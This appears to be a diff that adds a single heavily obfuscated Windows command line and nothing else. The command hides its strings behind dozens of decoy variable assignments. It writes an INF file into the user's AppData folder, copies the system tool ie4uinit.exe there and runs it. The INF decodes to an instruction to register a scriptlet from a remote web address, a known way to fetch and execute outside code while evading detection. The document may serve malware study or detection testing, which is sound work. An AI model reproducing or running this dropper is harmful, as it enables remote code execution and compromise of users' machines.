@@ -1,0 +1,34 @@
+/v /c  (for %g in ("Hetero=a" "Titmarshf=c" "Geezer=e" "Totipotentc=l" "Magnifi=s" "Despotis=t" ) do @set %~g) &&
+  (for %z in ("s") do @set "Outlip=%~z") &&
+  (for %d in ("t") do @set "Feuilletons=%~d") &&
+  (for %f in ("e") do @set "Hauteursr=%~f") &&
+  callcall(for %y in ("s") do @set "Outlip=%~y") &&
+  (for %f in ("r") do @set "Byroni=%~f") &&
+  (for %b in ("n") do @set "Unprice=%~b") &&
+  call(for %f in ("m") do @set "Edeolog=%~f") &&
+  callcall(for %l in ("t") do @set "Feuilletons=%~l") &&
+  (for %f in ("i") do @set "Metastr=%~f") &&
+  (for %x in ("a") do @set "Descript=%~x") &&
+  call(for %g in ("f") do @set "Coracopec=%~g") &&
+  callcallcall(for %x in ("[") do @set "Infiniteth=%~x") &&
+  (for %z in ("]") do @set "Antifeu=%~z") &&
+  (for %z in ("g") do @set "Salmo=%~z") &&
+  callcallcallcall(for %p in ("8") do @set "Labun=%~p") &&
+  callcallcallcallcallcall(for %j in ("h") do @set "Unaki=%~j") &&
+  callcall(for %l in ("w") do @set "Grammatitea=%~l") &&
+  (for %k in ("R") do @set "Create=%~k") &&
+  call(for %r in ("h") do @set "Unaki=%~r") &&
+  (for %z in ("p") do @set "Meliaceaed=%~z") &&
+  (for %p in ("%appdata%") do @set "Massicotite=%~p") &&
+  callcallcallcall(for %e in ("F") do @set "Axtree=%~e") &&
+  (for %o in ("7") do @set "Spille=%~o") &&
+  callcallcall(for %t in ("i") do @set "Metastr=%~t") &&
+  (for %p in ("u") do @set "Unbriefedon=%~p") &&
+  call(for %r in ("t") do @set "Feuilletons=%~r") &&
+  call(for %w in ("s") do @set "Outlip=%~w") &&
+  (for %c in ("r") do @set "Byroni=%~c") &&
+  callcall(for %d in ("h") do @set "Unaki=%~d") &&
+  callcallcall(for %x in ("2") do @set "Geminifor=%~x") &&
+  call(for %m in ("[Periosteo_445]" "%Grousersor%c%Chitlin%o%Nomenclator%\" "%Angle%.%Unclenched%l%Terap%,%Heterothall%I,%Lithotint%t%Rolowa%p%Sequen%/%Porkeryja%o%Overwash%j%Nomenclator%e%Portray%c%Anisuminext%m%Porkeryja%q%Anisuminext%j%Sprigg%b%Sprigg%" "[7ADFF]" "%Hannibal%e%Culve%i%Induem%i%Rolowa%.%Hannibal%n%Solemni%" "[defaultinstall.windows7]" "delfiles=7ADFF" "Un\" "Register\" "OCXs=Periosteo_445" "[strings]" "servicename= 'Terpsichore'" "shortsvcname= 'Terpsichore'" "Portray=." "Porkeryja=/" "Sequen=:" "Heterothall=N" "Overwash=a" "Nomenclator=b" "Unclenched=d" "Sprigg=e" "Solemni=f" "Lithotint=h" "Hannibal=i" "Angle=j" "Terap=l" "Induem=n" "Anisuminext=o" "Chitlin=r" "Grousersor=s" "Rolowa=t" "Culve=u" "[version]" "signature=$windowsnt$" "[destinationdirs]" "defaultdestdir=11" "7ADFF=01" ) do @echo %~m) > "%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%appdata%\microsoft" &&
+  start " " %appdata%\microsoft\ie4uinit.exe -basesettings
